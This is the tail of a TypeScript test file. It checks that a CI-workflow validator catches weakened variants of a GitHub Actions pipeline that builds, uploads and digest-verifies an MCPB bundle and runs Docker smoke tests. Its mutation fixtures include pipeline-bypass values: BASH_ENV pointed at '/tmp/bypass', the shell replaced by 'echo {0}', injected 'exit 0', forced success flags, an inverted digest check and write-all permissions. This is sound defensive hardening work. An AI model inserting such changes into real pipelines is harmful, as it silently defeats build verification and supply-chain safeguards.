            "        id: mcpb_export\n" +
            "        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7",
          "      - name: Export inspectable canonical MCPB candidate and transparency records\n" +
            "        id: mcpb_export\n" +
            "        uses: actions/upload-artifact@v7"
        ),
        pkg.engines?.node
      )
    ).toContain(
      "mcpb-basic package job must build, verify, and export one fail-closed canonical Linux bundle with inventory, SBOM, and notices"
    );
    const artifactCanaryProblem =
      "mcpb-basic package job must grant scoped Actions read access and verify the uploaded artifact by exact ID and digest";
    expect(
      nodeFloorCiProblems(replaceExactly(ci, "    timeout-minutes: 40", "    timeout-minutes: 30"), pkg.engines?.node)
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "      actions: read\n      contents: read", "      contents: read"),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "  lint:\n    runs-on: ubuntu-latest\n    timeout-minutes: 5",
          "  lint:\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n" +
            "    permissions:\n      actions: read\n      contents: read"
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "permissions:\n  contents: read", "permissions:\n  actions: read\n  contents: read"),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "permissions:\n  contents: read", "permissions: read-all"),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "permissions:\n  contents: read", "permissions: write-all"),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(replaceExactly(ci, "permissions:\n  contents: read\n", ""), pkg.engines?.node)
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "permissions:\n  contents: read\n",
          'permissions:\n  contents: read\n\nenv:\n  BASH_ENV: "/tmp/bypass"\n'
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "      NPM_CONFIG_SCRIPT_SHELL: /bin/bash\n",
          '      NPM_CONFIG_SCRIPT_SHELL: /bin/bash\n      BASH_ENV: "/tmp/bypass"\n'
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "        id: mcpb_export\n" +
            "        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7",
          "        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7"
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          `          ARTIFACT_ID: \${{ steps.mcpb_export.outputs.artifact-id }}`,
          `          ARTIFACT_ID: \${{ steps.mcpb_export.outputs.artifact-url }}`
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, `          ARTIFACT_ID: \${{ steps.mcpb_export.outputs.artifact-id }}\n`, ""),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          '"repos/$GITHUB_REPOSITORY/actions/artifacts/$ARTIFACT_ID/zip"',
          '"repos/$GITHUB_REPOSITORY/actions/artifacts/$GITHUB_RUN_ID/zip"'
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          `          ARTIFACT_DIGEST: \${{ steps.mcpb_export.outputs.artifact-digest }}`,
          `          ARTIFACT_DIGEST: \${{ steps.mcpb_export.outputs.artifact-id }}`
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, `          ARTIFACT_DIGEST: \${{ steps.mcpb_export.outputs.artifact-digest }}\n`, ""),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          '          BASH_ENV: ""\n          GH_HOST: github.com\n',
          '          BASH_ENV: "/tmp/bypass"\n          GH_HOST: github.com\n'
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          `          ARTIFACT_DIGEST: \${{ steps.mcpb_export.outputs.artifact-digest }}\n        shell: bash`,
          `          ARTIFACT_DIGEST: \${{ steps.mcpb_export.outputs.artifact-digest }}\n        shell: "echo {0}"`
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "    outputs:\n      artifact_name:",
          '    defaults:\n      run:\n        shell: "echo {0}"\n    outputs:\n      artifact_name:'
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(replaceExactly(ci, "^[0-9a-f]{64}$", "^(sha256:)?[0-9a-f]{64}$"), pkg.engines?.node)
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "Accept: application/vnd.github+json", "Accept: application/octet-stream"),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, '              -H "Accept: application/vnd.github+json" \\\n', ""),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(replaceExactly(ci, "timeout --kill-after=5s 30s gh api", "gh api"), pkg.engines?.node)
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "timeout --kill-after=5s 30s gh api", "timeout 30s gh api"),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "for attempt in {1..12}; do", "for attempt in {1..13}; do"),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "          set -euo pipefail\n", "          set -euo pipefail\n          exit 0\n"),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "          downloaded=false\n          for attempt in {1..12}; do",
          "          downloaded=false\n          downloaded=true\n          for attempt in {1..12}; do"
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "              ACTUAL_DIGEST=$(sha256sum \"$CANDIDATE_ZIP\" | awk '{print $1}')\n",
          "              ACTUAL_DIGEST=$(sha256sum \"$CANDIDATE_ZIP\" | awk '{print $1}')\n" +
            '              ARTIFACT_DIGEST="$ACTUAL_DIGEST"\n'
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          '              if [ "$ACTUAL_DIGEST" != "$ARTIFACT_DIGEST" ]; then\n' +
            '                echo "::error::downloaded Actions artifact digest differs from upload output"\n' +
            "                exit 1\n" +
            "              fi",
          '              if [ "$ACTUAL_DIGEST" = "$ARTIFACT_DIGEST" ]; then\n' +
            '                echo "::error::downloaded Actions artifact digest differs from upload output"\n' +
            "                exit 1\n" +
            "              fi"
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          '          if [ "$downloaded" != "true" ]; then\n' +
            '            echo "::error::Actions artifact $ARTIFACT_ID was not downloadable after 12 bounded attempts"\n' +
            "            exit 1\n" +
            "          fi",
          '          if [ "$downloaded" != "true" ]; then\n' +
            '            echo "::error::Actions artifact $ARTIFACT_ID was not downloadable after 12 bounded attempts"\n' +
            "            true\n" +
            "          fi"
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          '          echo "Verified Actions artifact id=$ARTIFACT_ID sha256=$ARTIFACT_DIGEST"',
          '          echo "Verified Actions artifact id=$ARTIFACT_ID"'
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "          compression-level: 0\n" + "      - name: Verify uploaded MCPB artifact through Actions REST",
          "          compression-level: 0\n" +
            "      - run: true\n" +
            "      - name: Verify uploaded MCPB artifact through Actions REST"
        ),
        pkg.engines?.node
      )
    ).toContain(artifactCanaryProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
          "actions/download-artifact@v8"
        ),
        pkg.engines?.node
      )
    ).toContain("mcpb-basic matrix must consume the exact pinned canonical Linux artifact on every OS");
    expect(
      nodeFloorCiProblems(
        replaceExactly(ci, "          digest-mismatch: error", "          digest-mismatch: warn"),
        pkg.engines?.node
      )
    ).toContain("mcpb-basic matrix must consume the exact pinned canonical Linux artifact on every OS");
    expect(
      nodeFloorCiProblems(replaceExactly(ci, "          path: artifacts", "          path: ."), pkg.engines?.node)
    ).toContain("mcpb-basic matrix must consume the exact pinned canonical Linux artifact on every OS");
    const dockerTimeoutProblem = "docker smoke probes must be exactly bounded and fail closed on process status";
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "  docker:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10",
          "  docker:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    continue-on-error: true"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "  docker:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10",
          "  docker:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    needs: test-macos"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "      - name: CLI smoke — the bin runs inside the image\n",
          "      - name: CLI smoke — the bin runs inside the image\n        if: false\n"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "      - name: MCP tools/list smoke — stdio introspection (what Glama does)\n",
          "      - name: MCP tools/list smoke — stdio introspection (what Glama does)\n        continue-on-error: true\n"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "      - name: CLI smoke — the bin runs inside the image\n" +
            "        # here-string `grep <<<` avoids the `grep -q` early-close EPIPE that, under",
          "      - name: CLI smoke — the bin runs inside the image\n" +
            "        continue-on-error: true\n" +
            "        # here-string `grep <<<` avoids the `grep -q` early-close EPIPE that, under"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          '        env:\n          BASH_ENV: ""\n        shell: bash\n        run: |\n' +
            "          docker_status=0\n" +
            "          out=$(timeout --kill-after=10s 60s docker run --rm enquire-mcp:ci --help)",
          '        env:\n          BASH_ENV: ""\n        shell: "echo {0}"\n        run: |\n' +
            "          docker_status=0\n" +
            "          out=$(timeout --kill-after=10s 60s docker run --rm enquire-mcp:ci --help)"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "timeout --kill-after=10s 60s docker run --rm enquire-mcp:ci --help",
          "timeout 60s docker run --rm enquire-mcp:ci --help"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "      - name: Build the introspection image\n        run: docker build -t enquire-mcp:ci .",
          "      - name: CLI smoke — the bin runs inside the image\n        run: true\n" +
            "      - name: Build the introspection image\n        run: docker build -t enquire-mcp:ci ."
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          '          echo "OK — tools/list returned obsidian_search over stdio"',
          '          echo "OK — tools/list returned obsidian_search over stdio"\n' +
            "      - name: Unbounded extra Docker probe\n" +
            "        run: docker run --rm enquire-mcp:ci --help"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "timeout --kill-after=10s 90s docker run --rm -i enquire-mcp:ci",
          "timeout 90s docker run --rm -i enquire-mcp:ci"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "out=$(timeout --kill-after=10s 60s docker run --rm enquire-mcp:ci --help) || docker_status=$?",
          "out=$(timeout --kill-after=10s 60s docker run --rm enquire-mcp:ci --help) || true"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "| timeout --kill-after=10s 90s docker run --rm -i enquire-mcp:ci) || docker_status=$?",
          "| timeout --kill-after=10s 90s docker run --rm -i enquire-mcp:ci) || true"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          '          if [ "$docker_status" -ne 0 ]; then\n' +
            '            echo "::error::Docker CLI smoke exited with status $docker_status"\n' +
            "            printf '%s\\n' \"$out\" | tail -c 600\n" +
            "            exit 1\n" +
            "          fi",
          '          if [ "$docker_status" -ne 0 ]; then\n' +
            '            echo "::error::Docker CLI smoke exited with status $docker_status"\n' +
            "            printf '%s\\n' \"$out\" | tail -c 600\n" +
            "            true\n" +
            "          fi"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "          docker_status=0\n" +
            "          out=$(timeout --kill-after=10s 60s docker run --rm enquire-mcp:ci --help)",
          "          docker_status=0\n" +
            "          docker run --rm enquire-mcp:ci --help >/dev/null\n" +
            "          out=$(timeout --kill-after=10s 60s docker run --rm enquire-mcp:ci --help)"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(
      nodeFloorCiProblems(
        replaceExactly(
          ci,
          "          out=$(timeout --kill-after=10s 60s docker run --rm enquire-mcp:ci --help) || docker_status=$?",
          '          echo "timeout --kill-after=10s 60s docker run --rm enquire-mcp:ci --help" >/dev/null\n' +
            "          out=$(docker run --rm enquire-mcp:ci --help) || docker_status=$?"
        ),
        pkg.engines?.node
      )
    ).toContain(dockerTimeoutProblem);
    expect(REQUIRED_RELEASE_CHECKS).not.toContain("test-windows");
  }, 60_000);
});
